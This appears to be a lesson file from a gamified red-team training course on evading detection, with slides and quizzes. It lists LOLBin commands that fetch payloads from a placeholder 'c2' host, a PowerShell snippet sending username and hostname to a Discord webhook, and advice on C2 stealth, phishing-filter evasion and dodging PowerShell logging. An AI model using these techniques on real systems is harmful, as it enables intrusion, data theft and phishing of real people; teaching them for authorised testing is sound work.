@@ -1,0 +1,134 @@
+{
+    "id": "l3",
+    "chapterId": "ch_11",
+    "title": "Evading Detection During Engagement",
+    "description": "Technical stealth techniques to avoid EDR, minimize network noise, and blend in.",
+    "xpReward": 40,
+    "estimatedMinutes": 10,
+    "section": "Technical Evasion",
+    "slides": [
+        {
+            "id": "s_l3_1",
+            "type": "text",
+            "title": "The Defender's Eye 👁️",
+            "content": "# What Does the Blue Team See?\n\n**Modern Telemetry Sources:**\n- **Endpoint Detection and Response (EDR):** Every process creation, file write, registry change, and network connection.\n- **SIEM (Security Information and Event Management):** Aggregated logs from firewalls, proxies, VPN, and authentication.\n- **Email Gateway:** Inbound/outbound email content, attachments, links.\n- **Network Traffic Analysis (NTA):** Flow data, DNS requests, beaconing patterns.\n- **Honeypots / Canaries:** Fake credentials and files that trigger alerts when accessed.\n\n**The Attacker's Dilemma:** You need to perform **actions** to achieve objectives. Actions generate **telemetry**. Telemetry generates **alerts**.\n\n**The Solution:** Make your actions look like **normal user behavior** or **legitimate administrative activity**."
+        },
+        {
+            "id": "s_l3_2",
+            "type": "quiz",
+            "title": "Telemetry Check 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l3_1",
+                "type": "multiple_choice",
+                "question": "An EDR solution like CrowdStrike or Microsoft Defender for Endpoint is primarily designed to monitor activity on which layer?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "Network perimeter",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "Individual endpoints (workstations and servers)",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Cloud configurations",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "Email traffic only",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Correct. EDR provides deep visibility into process, file, and network activity on the endpoint itself.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l3_3",
+            "type": "text",
+            "title": "Living Off the Land (LOLBins) 🏡",
+            "content": "# Using Their Tools Against Them\n\n**Definition:** **LOLBins** (Living Off the Land Binaries) are legitimate, signed Microsoft executables that can be abused for malicious purposes.\n\n**Why Use LOLBins?**\n- **Trusted:** They are signed by Microsoft. EDR often whitelists or scrutinizes them less.\n- **Pre-installed:** No need to drop suspicious `.exe` files to disk.\n- **Common:** Their execution is frequent in normal environments.\n\n**Essential LOLBins for Social Engineers:**\n\n| Binary | Malicious Use | Example Command |\n| :--- | :--- | :--- |\n| `powershell.exe` | Download & execute scripts | `powershell -c \"IEX(...)\"` |\n| `mshta.exe` | Execute remote HTA payloads | `mshta http://c2/payload.hta` |\n| `rundll32.exe` | Execute shellcode or JavaScript | `rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication ...\"` |\n| `regsvr32.exe` | Execute remote COM scriptlets | `regsvr32 /s /n /u /i:http://c2/payload.sct scrobj.dll` |\n| `certutil.exe` | Download files | `certutil -urlcache -split -f http://c2/payload.exe` |\n| `wmic.exe` | Execute commands remotely | `wmic process call create \"cmd /c calc.exe\"` |"
+        },
+        {
+            "id": "s_l3_4",
+            "type": "quiz",
+            "title": "LOLBins Check 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l3_2",
+                "type": "multiple_choice",
+                "question": "You need to download a file from your C2 server without using PowerShell or dropping a custom downloader. Which LOLBin can accomplish this?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "calc.exe",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "certutil.exe",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "notepad.exe",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "explorer.exe",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Correct. `certutil.exe` has a `-urlcache` flag that can download files from URLs. It's a legitimate certificate management tool.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l3_5",
+            "type": "text",
+            "title": "Network Evasion & C2 Communication 📡",
+            "content": "# Hiding in Plain Sight\n\n**The Problem:** C2 beacons generate **periodic network traffic**. This is a massive detection opportunity for Blue Teams.\n\n**Evasion Techniques:**\n\n| Technique | Description | Detection Difficulty |\n| :--- | :--- | :--- |\n| **Domain Fronting** | Route traffic through CDNs (CloudFront, Azure) so it appears to go to a legitimate domain. | High |\n| **HTTPS with Custom Malleable Profile** | Make C2 traffic look exactly like normal web browsing (e.g., mimicking Google Analytics, jQuery requests). | High |\n| **DNS Tunneling** | Exfiltrate data and send commands via DNS queries. (Noisy but effective). | Medium |\n| **Sleep/Jitter** | Randomize the time between beacon check-ins (e.g., sleep 30s + random 15s). Avoids predictable patterns. | Medium |\n| **Fallback Channels** | If primary C2 is blocked, use a secondary channel (e.g., dead drop on Pastebin). | High |\n\n**Pro Tip:** Use **Legitimate Services** for C2. Discord webhooks, Slack bots, Microsoft Graph API. Traffic to `discord.com` is rarely blocked."
+        },
+        {
+            "id": "s_l3_6",
+            "type": "code",
+            "title": "C2 with Discord Webhook (Example) 📨",
+            "content": "A stealthy way to exfiltrate data using a legitimate service:",
+            "codeSnippet": "# PowerShell snippet to send data to Discord\n$webhook = \"https://discord.com/api/webhooks/12345/abcde\"\n$data = @{content = \"User: $env:USERNAME | Host: $env:COMPUTERNAME\"} | ConvertTo-Json\nInvoke-RestMethod -Uri $webhook -Method Post -Body $data -ContentType \"application/json\"\n\n# This looks like normal Discord API traffic to the Blue Team.",
+            "codeLanguage": "powershell",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l3_7",
+            "type": "text",
+            "title": "Avoiding Phishing Detection 📧",
+            "content": "# Evading the Email Filter\n\n**Goal:** Land in the **Inbox**, not **Quarantine** or **Spam**.\n\n**Technical Evasion for Phishing Emails:**\n1.  **Warm Up Your Domain/IP:** Don't blast 1000 emails from a brand new domain. Gradually increase volume over weeks.\n2.  **SPF/DKIM/DMARC:** Configure them **correctly** for your sending domain. This is the #1 deliverability factor.\n3.  **Content Obfuscation:** Avoid spam-trigger words ('Urgent', 'Password', 'Click Here'). Use images instead of text, or use homoglyphs.\n4.  **Link Obfuscation:** Use redirectors (e.g., legitimate URL shorteners, or compromised websites) to hide the final phishing domain.\n5.  **Reputation Checking:** Use tools to check if your sending IP is on any blacklists before the campaign.\n\n**The Human Evasion:** Even if it hits the inbox, the user might report it. **Make the email boring.** Generic IT notifications get reported less than 'Click for $500 Gift Card!'."
+        },
+        {
+            "id": "s_l3_8",
+            "type": "quiz",
+            "title": "Phishing Evasion 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l3_3",
+                "type": "true_false",
+                "question": "True or False: Sending a large volume of phishing emails from a newly registered domain is a recommended practice to maximize impact quickly.",
+                "options": [],
+                "explanation": "False. New domains have no reputation and high volume triggers spam filters immediately. 'Warming up' the domain over time is essential for deliverability.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l3_9",
+            "type": "warning",
+            "title": "Endpoint Logging Evasion 📝",
+            "content": "## PowerShell Logging is Your Enemy\n\n**What Blue Team Sees:**\n- **ScriptBlock Logging:** Full content of every PowerShell command executed.\n- **Module Logging:** Details of loaded modules.\n- **Transcription:** Full console output saved to file.\n\n**Evasion Techniques:**\n- **Unmanaged PowerShell:** Run PowerShell without `powershell.exe` (e.g., using `System.Management.Automation` from within C#).\n- **Obfuscation:** Break commands into pieces, use Base64 encoding, use aliases.\n- **Downgrade Attacks:** Force PowerShell version 2 (if available) which lacks advanced logging.\n- **Disable Logging (Risky):** Tampering with logging configurations is a **high-severity alert**. Avoid if possible.\n\n**Best Practice:** **Minimize PowerShell usage.** Use LOLBins, WMI, or COM objects directly from VBA/HTA whenever possible."
+        }
+    ]
+}
